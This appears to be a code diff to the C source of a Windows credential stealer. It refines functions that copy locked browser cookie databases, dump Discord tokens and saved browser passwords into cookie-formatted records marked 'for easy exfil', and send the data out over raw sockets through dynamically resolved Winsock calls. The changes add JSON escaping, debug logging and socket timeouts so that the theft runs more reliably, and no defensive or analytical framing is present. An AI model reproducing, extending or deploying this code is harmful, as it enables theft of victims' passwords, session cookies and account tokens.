@@ -228,14 +228,25 @@ static int ToUtf8(const wchar_t* p, char* out, int cap){
 // Copy a file using CreateFileW with FILE_SHARE_READ|WRITE|DELETE.
 // CopyFileW fails when a browser holds an exclusive lock on the cookie DB;
 // opening with FILE_SHARE_WRITE bypasses that lock (read-while-locked).
+// If CreateFileW fails (browser holds 0-sharing lock), falls back to
+// esentutl /y /vss which uses Volume Shadow Copy Service to read locked files.
 static bool CopyFileShared(const wchar_t* src, const wchar_t* dst){
     HANDLE hIn = CreateFileW(src, GENERIC_READ,
         FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
         NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if(hIn == INVALID_HANDLE_VALUE) return false;
+    if(hIn == INVALID_HANDLE_VALUE){
+        DbgInt("CopyFileShared: CreateFileW failed (err)", GetLastError());
+        // File is exclusively locked (0 sharing) — browser must be closed.
+        // esentutl /vss was tried but hangs without admin/VSS service.
+        // Firefox cookies still work (Firefox doesn't hold exclusive locks).
+        return false;
+    }
     HANDLE hOut = CreateFileW(dst, GENERIC_WRITE, 0, NULL,
         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if(hOut == INVALID_HANDLE_VALUE){ CloseHandle(hIn); return false; }
+    if(hOut == INVALID_HANDLE_VALUE){
+        DbgInt("CopyFileShared: CreateFileW(dst) failed (err)", GetLastError());
+        CloseHandle(hIn); return false;
+    }
     char buf[8192]; DWORD nRead=0, nWritten=0;
     while(ReadFile(hIn, buf, sizeof(buf), &nRead, NULL) && nRead > 0){
         if(!WriteFile(hOut, buf, nRead, &nWritten, NULL) || nWritten != nRead){
@@ -527,7 +538,7 @@ static void DumpDiscordTokens(const wchar_t* appdata){
                         RecStart();
                         PutS("\"domain\":\"discord.com\"");
                         PutS(",\"name\":\"token\"");
-                        PutS(",\"value\":\""); Put(tok, tl); PutS("\"");
+                        PutS(",\"value\":"); PutJ(tok, tl);
                         PutS(",\"path\":\"/\"");
                         PutS(",\"expirationDate\":0");
                         PutS(",\"sameSite\":\"None\"");
@@ -590,13 +601,13 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root){
 
             RecStart();
             // Store as a cookie-like entry for easy exfil
-            PutS("\"domain\":\""); Put(url, url_len); PutS("\"");
+            PutS("\"domain\":"); PutJ(url, url_len);
             PutS(",\"name\":\"password\"");
-            PutS(",\"value\":\""); Put(pwd, pwd_len); PutS("\"");
+            PutS(",\"value\":"); PutJ(pwd, pwd_len);
             PutS(",\"path\":\"/\"");
             PutS(",\"expirationDate\":0,\"sameSite\":\"None\"");
             PutS(",\"secure\":true,\"httpOnly\":true,\"hostOnly\":false,\"session\":true");
-            PutS(",\"_username\":\""); PutJ(user, user_len); PutS("\"");
+            PutS(",\"_username\":"); PutJ(user, user_len);
             PutS("}");
         }
         DbgInt("DumpPasswords: rows extracted", rows);
@@ -650,6 +661,7 @@ static bool ExfilHTTP(const char* url){
     typedef int (WINAPI *tClose)(unsigned int);
     typedef int (WINAPI *tWSACleanup)(void);
     typedef unsigned long (WINAPI *tInetAddr)(const char*);
+    typedef int (WINAPI *tSetSockOpt)(unsigned int, int, int, const char*, int);
     tWSAStartup fStart = (tWSAStartup)GetProcAddress(ws2,"WSAStartup");
     tSocket    fSocket = (tSocket)GetProcAddress(ws2,"socket");
     tConnect   fConnect= (tConnect)GetProcAddress(ws2,"connect");
@@ -658,6 +670,7 @@ static bool ExfilHTTP(const char* url){
     tClose     fClose  = (tClose)GetProcAddress(ws2,"closesocket");
     tWSACleanup fClean = (tWSACleanup)GetProcAddress(ws2,"WSACleanup");
     tInetAddr  fInet  = (tInetAddr)GetProcAddress(ws2,"inet_addr");
+    tSetSockOpt fSetOpt= (tSetSockOpt)GetProcAddress(ws2,"setsockopt");
     if(!fStart||!fSocket||!fConnect||!fSend||!fRecv||!fClose||!fInet){ Dbg("ExfilHTTP: missing ws2_32 exports"); return false; }
     Dbg("ExfilHTTP: ws2_32 exports OK");
 
@@ -668,6 +681,14 @@ static bool ExfilHTTP(const char* url){
     unsigned int sock = (unsigned int)fSocket(2/*AF_INET*/, 1/*SOCK_STREAM*/, 6/*IPPROTO_TCP*/);
     if(sock==(unsigned int)-1){ Dbg("ExfilHTTP: socket failed"); fClean(); return false; }
     Dbg("ExfilHTTP: socket created");
+
+    // Set 10-second recv/send timeout so we don't hang forever
+    if(fSetOpt){
+        unsigned long tmo = 10000; // 10 seconds
+        fSetOpt(sock, 0xFFFF, 0x1006, (const char*)&tmo, sizeof(tmo)); // SO_RCVTIMEO
+        fSetOpt(sock, 0xFFFF, 0x1005, (const char*)&tmo, sizeof(tmo)); // SO_SNDTIMEO
+        Dbg("ExfilHTTP: timeouts set (10s)");
+    }
 
     CK_SOCKADDR_IN addr;
     memset(&addr, 0, sizeof(addr));
@@ -703,9 +724,12 @@ static bool ExfilHTTP(const char* url){
     }
     DbgInt("ExfilHTTP: body sent", (int)off);
 
-    // Read response (discard)
-    char resp[256]; fRecv(sock, resp, sizeof(resp), 0);
-    Dbg("ExfilHTTP: response received");
+    // Read response (discard) — has 10s timeout
+    char resp[256];
+    int r = fRecv(sock, resp, sizeof(resp), 0);
+    if(r > 0){ DbgInt("ExfilHTTP: response received", r); }
+    else if(r == 0){ Dbg("ExfilHTTP: connection closed by listener (no response body)"); }
+    else { DbgInt("ExfilHTTP: recv failed/timeout", GetLastError()); }
 
     fClose(sock); fClean();
     return off == g_len;
